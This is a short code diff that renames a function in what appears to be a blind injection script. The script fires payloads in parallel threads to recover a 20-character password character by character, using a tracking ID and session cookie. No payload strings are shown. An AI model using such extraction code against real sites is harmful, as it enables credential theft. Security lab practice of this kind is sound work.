@@ -40,7 +40,7 @@ def test_character_for_position(position, char, payload, headers, url, tracking_
                 found_password[position - 1] = char
                 print(f"Character found for position {position}: {char}")
 
-def test_characters_for_position(position, headers, url, tracking_id, session_id, option):
+def submit_payloads_in_parallel(position, headers, url, tracking_id, session_id, option):
     with concurrent.futures.ThreadPoolExecutor() as executor:
         futures = []
         for char in characters:
@@ -60,7 +60,7 @@ def retrieve_password(headers, url, tracking_id, session_id, option):
     start_time = time.time()
 
     for position in range(1, 21):
-        test_characters_for_position(position, headers, url, tracking_id, session_id, option)
+        submit_payloads_in_parallel(position, headers, url, tracking_id, session_id, option)
 
     retrieved_password = ''.join(found_password)
     print(f"The retrieved password is: {retrieved_password}")
